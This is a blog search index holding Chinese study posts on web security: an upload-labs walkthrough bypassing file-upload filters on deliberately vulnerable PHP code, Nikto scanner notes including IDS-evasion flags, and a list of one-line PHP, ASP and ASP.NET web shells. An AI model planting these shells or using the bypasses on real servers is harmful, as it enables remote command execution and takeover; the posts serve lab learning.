<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[upload-labs（1-5）]]></title>
      <url>/2018/07/11/upload-labs/</url>
      <content type="html"><![CDATA[<p>lalala</p>
<a id="more"></a>
<h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01:"></a>Pass-01:</h1><h2 id="Pass-01源码"><a href="#Pass-01源码" class="headerlink" title="Pass-01源码:"></a>Pass-01源码:</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">  <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">        alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">  <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">  <span class="comment">//提取上传文件的类型</span></span><br><span class="line">  <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">  <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">  <span class="keyword">if</span> (allow_ext.indexOf(ext_name + <span class="string">"|"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个是js的代码，允许上传的类型是.jpg,.png,.gif的文件<br><strong> 提示： </strong><br><img src="/2018/07/11/upload-labs/01.png" alt=""></p>
<p><strong>客户端JS检测</strong>：</p>
<ol>
<li><p>禁用js，上传.php文件(我用的是这个，因为懒)</p>
</li>
<li><p>先在本地改成符合的图片格式，然后抓包改回成.php文件</p>
</li>
</ol>
<p>按F12打开查看器，找到上传的路径<br><img src="/2018/07/11/upload-labs/04.png" alt=""></p>
<h1 id="Pass-02："><a href="#Pass-02：" class="headerlink" title="Pass-02："></a>Pass-02：</h1><h2 id="Pass-02源码："><a href="#Pass-02源码：" class="headerlink" title="Pass-02源码："></a>Pass-02源码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">	$is_upload = <span class="keyword">false</span>;</span><br><span class="line">	$msg = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">	</span><br><span class="line">	    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">		</span><br><span class="line">	        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">			<span class="comment">//判断类型为.jpeg,.png,.gif</span></span><br><span class="line">	            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], </span><br><span class="line">				$UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">				<span class="comment">//判断文件是否上传</span></span><br><span class="line">	             $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">	             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        $msg = $UPLOAD_ADDR.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line">根据提示</span><br><span class="line">**提示： **</span><br><span class="line"></span><br><span class="line">![](upload-labs/<span class="number">02.</span>png)</span><br><span class="line"></span><br><span class="line">根据提示，**MIME检测**</span><br><span class="line"></span><br><span class="line">上传一个.php文件，然后抓包，然后将Content-Type的application/octet-stream改成image/jpeg或者image/png或者image/gif</span><br><span class="line">![](upload-labs/<span class="number">03.</span>png)</span><br><span class="line"></span><br><span class="line">上传成功</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-03： #</span></span><br><span class="line"><span class="comment">## Pass-03源码： ##</span></span><br><span class="line">```php</span><br><span class="line">	$is_upload = <span class="keyword">false</span>;</span><br><span class="line">	$msg = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">		<span class="comment">//黑名单</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">		<span class="comment">//trim() 函数移除字符串两侧的空白字符或其他预定义字符。</span></span><br><span class="line">		<span class="comment">//如果省略，就移除"\0"、"\t"、"\n"、"\x0B"（垂直制表符）、"\t"、""（空格）</span></span><br><span class="line">        $file_name = deldot($file_name);</span><br><span class="line">		<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">		<span class="comment">//从文件名字符串中最后出现'.'的位置开始，到末尾，即获取后缀名</span></span><br><span class="line">        $file_ext = strtolower($file_ext); </span><br><span class="line">		<span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);</span><br><span class="line">		<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); </span><br><span class="line">		<span class="comment">//收尾去空</span></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">		<span class="comment">//不在黑名单中</span></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR. <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR .<span class="string">'/'</span>. $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">				<span class="comment">//上传路径为****/上传文件名</span></span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">```	</span><br><span class="line"></span><br><span class="line">**黑名单检测**</span><br><span class="line"></span><br><span class="line">检测的名单是<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span></span><br><span class="line">大小写，加空格绕过方式不行，可以用不在黑名单列表中的后缀名，例如：php5，php7等等；也可以用.htaccess重写文件解析规则绕过</span><br><span class="line"></span><br><span class="line">（htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以实现：网页<span class="number">301</span>重定向、自定义<span class="number">404</span>错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。）</span><br><span class="line"></span><br><span class="line">**①利用不在黑名单中的后缀名绕过**</span><br><span class="line">上传一个内容为`<span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">'a'</span>]); <span class="meta">?&gt;</span>`，后缀名改成php5的文件，上传成功后连蚁剑：</span><br><span class="line"></span><br><span class="line">shell url：http:<span class="comment">//127.0.0.1/upload-labs/upload/eval03.php5</span></span><br><span class="line"></span><br><span class="line">shell pwd：a</span><br><span class="line"></span><br><span class="line">然后......</span><br><span class="line"></span><br><span class="line">**②.htaccess重写文件解析规则绕过：**</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 创建htaccess文件，编辑内容为：</span><br><span class="line"></span><br><span class="line">	`&lt;FilesMatch <span class="string">"eval03"</span>&gt;`</span><br><span class="line">	`SetHandler application/x-httpd-php`</span><br><span class="line">	`&lt;/FilesMatch&gt;`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> 然后再上传eval03.jpg的木马, 这样eval03.jpg就可解析为php文件。</span><br><span class="line">![](upload-labs/<span class="number">05.</span>png)</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span> 上传成功后，在蚁剑里shell url里写 http:<span class="comment">//127.0.0.1/upload-labs/upload/eval03.jpg，shell pwd里写 a，然后.......</span></span><br><span class="line">![](upload-labs/<span class="number">06.</span>png)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Pass-04 #</span></span><br><span class="line"><span class="comment">## Pass-04源码： ##</span></span><br><span class="line">```php</span><br><span class="line">	$is_upload = <span class="keyword">false</span>;</span><br><span class="line">	$msg = <span class="keyword">null</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">	    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">	        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">	        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">	        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">	        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">	        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">	        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">	        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line">	</span><br><span class="line">	        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">	            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">	                $img_path = $UPLOAD_ADDR . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">	                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">	            &#125;</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	            $msg = <span class="string">'此文件不允许上传!'</span>;</span><br><span class="line">	        &#125;</span><br><span class="line">	    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p><strong>黑名单检测</strong></p>
<p>检测的名单有很多，大小写，加空格绕过方式不行，将后缀名改成php5、php7等等也不行，可以用<code>.htaccess</code>重写文件解析规则绕过，如上题</p>
<h1 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h1><h2 id="Pass-05源码："><a href="#Pass-05源码：" class="headerlink" title="Pass-05源码："></a>Pass-05源码：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>黑名单检测</strong><br>这次检测没有大小写转化，因此可以将文件后缀名改成部分大写绕过</p>
<p><img src="/2018/07/11/upload-labs/07.png" alt=""></p>
<p>上传成功</p>
<p>蚁剑：shell url：<a href="http://127.0.0.1/upload-labs/upload/eval05.PhP" target="_blank" rel="noopener">http://127.0.0.1/upload-labs/upload/eval05.PhP</a></p>
<p>shell pwd：a</p>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[安全牛学习笔记（一）扫描工具——NIKTO]]></title>
      <url>/2018/07/10/%E7%AC%94%E8%AE%B0%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7nikto/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;<br>emmmm这节课真的真的真的好长哇！</p>
<p>扫描工具——NIKTO（Peri语言开发的开源web安全扫描器）<br>扫描：<br>    ①web服务器的软件版本（IIS、Apache还是别别的）<br>    ②搜索存在安全隐患的文件（例如有些维护web服务器后留下的以日期命名的备份文件，就能得到目标网站的源代码）<br>    ③服务器配置漏洞（默认配置不是安全的设置）<br>    ④web application层面的安全隐患（xss，SQL注入等）<br>    ⑤避免404误判<br>    例：很多服务器不遵守RFC标准，对于不存在的对象返回200<br>    依据相应文件内容判断，不同扩展名的文件404相应内容不同（如jsp、cji）<br>    去除时间信息后的内容取md5值<br>参数：-no404（不进行误判尝试判断，可能存在误判，能提高速度）</p>
<p>常用命令：可以用man nikto来查看更多的信息<br>①nikto -update（从CIRT.net这个网址去升级数据库和插件，使用之前还是先update一下比较好）</p>
<p>②nikto -list-plugins：查看各种插件类型（；例如auth、fileops、ssl、tests等等，提一点shellshock！）<br>如果通过命令不行，那就去找这个网址：<a href="http://cirt.net/nikto/UPDATES，会有很多版本" target="_blank" rel="noopener">http://cirt.net/nikto/UPDATES，会有很多版本</a></p>
<p>③nikto -host <a href="http://1.1.1.1" target="_blank" rel="noopener">http://1.1.1.1</a> （后面的URL是扫描的目标，可以用靶机玩）<br>nikto -host <a href="http://192.168.1.109/dvwa/（扫描192.168.1.109的dvwa目录）" target="_blank" rel="noopener">http://192.168.1.109/dvwa/（扫描192.168.1.109的dvwa目录）</a></p>
<p>④nikto -host 192.168.1.109 port 80,443（扫描端口，多个端口可以一起来指定）<br>nikto -host 192.168.1.109 port 80（会用各种http的方式去连接，去检测端口）</p>
<p>⑤nikto -host www.baidu.com -port 443 -ssl（www.baidu.com是主机名，https默认的端口为443，-ssl：检测https）<br>解析结果举例：<br>(1)扫百度<br>    Target IP：主机的ip<br>    Target Hostname：主机名<br>    Target Port：端口<br>    SSL Info：使用证书的相关信息 （Subject：证书的信息；Cipers：证书加密的方式等等。<br><img src="/2018/07/10/笔记扫描工具nikto/01.png" alt=""><br>    robots.txt contains 103 entries which should be manually viewed：这句话大致讲：很需要查看一下这个robots.txt文件<br><img src="/2018/07/10/笔记扫描工具nikto/02.png" alt=""></p>
<p>(2)扫自己的靶机</p>
<p><img src="/2018/07/10/笔记扫描工具nikto/03.png" alt=""></p>
<p>1、X-XSS-Protection 响应头是Internet Explorer，Chrome和Safari的一个功能，当检测到跨站脚本攻击 (XSS)时，浏览器将停止加载页面。例如：<br>    X-XSS-Protection: 0 禁止XSS过滤<br>    X-XSS-Protection: 1 启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。<br>    X-XSS-Protection: 1; mode=block 启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。<br>    X-XSS-Protection: 1; report=<reporting-uri> 启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。<br>2、X-Content-Type-Options 响应首部相当于一个提示标志，MIME类型嗅探<br>3、Apache的版本为2.2.8，是过期的版本，当前至少应该是2.4.12版本<br><img src="/2018/07/10/笔记扫描工具nikto/04.png" alt=""><br>4、HTTP TRACE method is active……. <script>(‘Vulnerable’)</script><br>TRACE请求方式：回显服务器收到的请求，主要用于测试或诊断，可用来进行跨站脚本（XSS）攻击，这种攻击方式又称为跨站跟踪攻击（XST）。<br>5、/phpMyAdmin/changelog.php…….能知道后端数据库使用MySQL，可以有针对性的注入<br><img src="/2018/07/10/笔记扫描工具nikto/05.png" alt=""></reporting-uri></p>
<p>⑥nikto -host host.txt<br>将需要扫描的多个网站的地址放在txt文档里，然后扫描<br>txt文档中的格式：1. 192.168.60.90:80; 2. <a href="https://192.168.60.90:8443" target="_blank" rel="noopener">https://192.168.60.90:8443</a>; 3. 192.168.60.90（默认扫描80端口）</p>
<p>⑦nmap -p80 192.168.1.0/24 -oG - | nikto -host –</p>
<p><img src="/2018/07/10/笔记扫描工具nikto/06.png" alt=""></p>
<p>结合nmap一起扫描，-oG指输出内容，第一个”-“表示输出的结果，再用|给nikto扫，第二个”-“表示nmap扫描出来的开放的端口的IP地址</p>
<p>⑧nikto -host <a href="https://www.baidu.com" target="_blank" rel="noopener">https://www.baidu.com</a> -useproxy <a href="http://localhost:8087" target="_blank" rel="noopener">http://localhost:8087</a> 用代理去扫描</p>
<p>⑨当一个IP有两个主机时，需要用-vhost来查看<br>nikto -vhost 域名 …还是可以加代理的</p>
<p>⑩nikto interactive<br><img src="/2018/07/10/笔记扫描工具nikto/07.png" alt=""></p>
<p>nikto 配置文件（/etc/nikto.conf）<br><img src="/2018/07/10/笔记扫描工具nikto/08.png" alt=""></p>
<p><img src="/2018/07/10/笔记扫描工具nikto/09.png" alt=""></p>
<p><img src="/2018/07/10/笔记扫描工具nikto/10.png" alt=""></p>
<p>①设置cookie：<br>将cookie的值写进配置文件里，然后nikto -host <a href="http://192.168.1.109/dvwa/" target="_blank" rel="noopener">http://192.168.1.109/dvwa/</a> ，再用d（debug）去查看cookie是否已经生效<br>②-evasion：使用LibWhisker中对IDS的躲避技术，可使用以下几种类型：</p>
<ol>
<li>随机URL编码（非UTF-8方式）</li>
<li>自选择路径（/./）</li>
<li>过早结束的URL</li>
<li>优先考虑长随机字符串</li>
<li>参数欺骗</li>
<li>使用TAB作为命令的分隔符</li>
<li>使用变化的URL</li>
<li>使用Windows路径分隔符“\”<br>举例：nikto -host <a href="http://192.168.43.165/dvwa/" target="_blank" rel="noopener">http://192.168.43.165/dvwa/</a> -evasion 167（采用逃避技术167来扫描192.168.43.165的dvwa目录）</li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> web </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[跟大佬学的文件上传绕过]]></title>
      <url>/2018/07/07/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/</url>
      <content type="html"><![CDATA[<p>&lt; !–more–&gt;</p>
<p>潘老师人美心善，炒鸡炒鸡耐心教我这个小白，特别感恩！</p>
<p>一句话木马<br>PHP：<br>    &lt;?php echo shell_exec($_GET[‘a’]);?&gt;<br>    &lt;?php @eval($_POST[‘a’]); ?&gt;<br>ASP:<br>    &lt;%eval request(“Cknife”)%&gt;<br>ASP.NET:<br>    &lt;%@ Page Language=”Jscript”%&gt;&lt;%eval(Request.Item[“Cknife”],”unsafe”);%&gt;</p>
